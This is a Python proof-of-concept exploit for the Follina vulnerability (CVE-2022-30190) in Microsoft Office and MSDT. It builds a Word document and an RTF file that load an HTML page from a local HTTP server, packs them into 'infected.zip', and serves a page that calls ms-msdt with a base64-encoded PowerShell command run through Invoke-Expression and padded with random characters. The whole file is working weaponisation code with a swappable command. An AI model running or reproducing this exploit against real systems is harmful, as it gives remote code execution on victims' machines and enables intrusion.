#!/usr/bin/env python3

import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading

# --- EDIT HERE
COMMAND='calc'
OUTPUT='one-click.doc'
OUTPUT_RTF='zero-click.rtf'
INTERFACE='eth0'
PORT=8000
# ---

def main():
    print("[*] CVE 2022-30190 (Follina) POC")
    print("[*] Author: Gianluca Tiepolo <github.com/tiepologian/Follina>")

    try:
        serve_host = ipaddress.IPv4Address(INTERFACE)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(INTERFACE)[netifaces.AF_INET][0]["addr"]
        except ValueError:
            print("[!] Error detecting IP address")
            exit()

    doc_suffix = "doc"
    staging_dir = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    doc_path = os.path.join(staging_dir, doc_suffix)
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))

    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)

    document_rels_path = os.path.join(staging_dir, doc_suffix, "word", "_rels", "document.xml.rels")

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace("{staged_html}", f"http://{serve_host}:{PORT}/index.html")

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)

    shutil.make_archive(OUTPUT, "zip", doc_path)
    os.rename(OUTPUT + ".zip", OUTPUT)

    shutil.copyfile('rtf/template.rtf', OUTPUT_RTF)
    with open(OUTPUT_RTF) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace("{IP_ADDRESS}", serve_host)
    external_referral = external_referral.replace("{PORT}", str(PORT))

    with open(OUTPUT_RTF, "w") as filp:
        filp.write(external_referral)

    with zipfile.ZipFile("infected.zip", mode="w") as archive:
        archive.write(OUTPUT)
        archive.write(OUTPUT_RTF)

    os.remove(OUTPUT)
    os.remove(OUTPUT_RTF)
    print("[*] Created ZIP archive with malicious docs: infected.zip")

    command = COMMAND
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += ("".join([random.choice(string.ascii_lowercase) for _ in range(4096)]) + "\n</script>")

    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    class ReuseTCPServer(socketserver.TCPServer):
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.server_address)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_path, **kwargs)

        def log_message(self, format, *func_args):
            super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", PORT), Handler) as httpd:
            httpd.serve_forever()

    print(f"[*] Deploying payload on :{PORT}")
    serve_http()


if __name__ == "__main__":
    main()
